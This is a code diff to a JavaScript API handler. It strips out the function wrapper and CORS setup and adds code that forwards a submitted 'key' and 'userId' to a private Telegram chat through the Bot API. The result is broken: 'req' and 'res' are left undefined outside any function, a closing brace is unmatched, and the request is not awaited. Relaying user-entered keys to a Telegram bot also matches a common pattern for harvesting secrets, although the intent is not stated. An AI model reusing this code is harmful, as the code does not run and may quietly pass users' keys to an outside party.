@@ -1,31 +1,24 @@
-export default function handler(req, res) {
+if (req.method === "POST") {
+  const { key, userId } = req.body || {};
 
-  res.setHeader(
-    "Access-Control-Allow-Origin",
-    "https://sharif31-cloud.github.io"
-  );
+  const message = `🎁 New Reward Key:\n\nKey: ${key}\nUser: ${userId}`;
 
-  res.setHeader(
-    "Access-Control-Allow-Methods",
-    "GET, POST, OPTIONS"
-  );
+  const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
 
-  res.setHeader(
-    "Access-Control-Allow-Headers",
-    "Content-Type"
-  );
-
-  if (req.method === "OPTIONS") {
-    return res.status(200).end();
-  }
-
-  if (req.method === "POST") {
-    return res.status(200).json({
-      success: true
-    });
-  }
+  fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  });
 
   return res.status(200).json({
-    status: "API working"
+    success: true,
+    sent: true
   });
 }
